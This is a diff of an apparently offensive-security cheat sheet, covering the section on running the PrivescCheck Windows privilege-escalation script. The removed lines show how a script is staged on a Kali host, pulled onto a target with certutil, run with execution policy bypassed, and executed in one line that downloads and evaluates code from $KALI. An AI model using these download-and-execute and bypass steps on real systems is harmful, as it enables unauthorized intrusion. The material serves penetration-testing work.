@@ -978,31 +978,12 @@ Invoke-AllChecks
 
 ### 8.2. [PrivescCheck](https://github.com/itm4n/PrivescCheck)
 
-Prepare Kali:
-
-```sh
-curl -sLo /var/www/html/PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
+```pwsh
+Invoke-WebRequest -Uri https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1 -OutFile .\PrivescCheck.ps1
 ```
 
-Import on target:
-
 ```cmd
-certutil.exe -urlcache -f -split http://$KALI/PrivescCheck.ps1
-Set-ExecutionPolicy Bypass -Scope CurrentUser
-Import-Module .\PrivescCheck.ps1
-Get-Module
-```
-
-Run check:
-
-```cmd
-Invoke-PrivescCheck
-```
-
-Or run it in a single line:
-
-```cmd
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/PrivescCheck.ps1'); Invoke-PrivescCheck"
+powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
 ### 8.3. [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
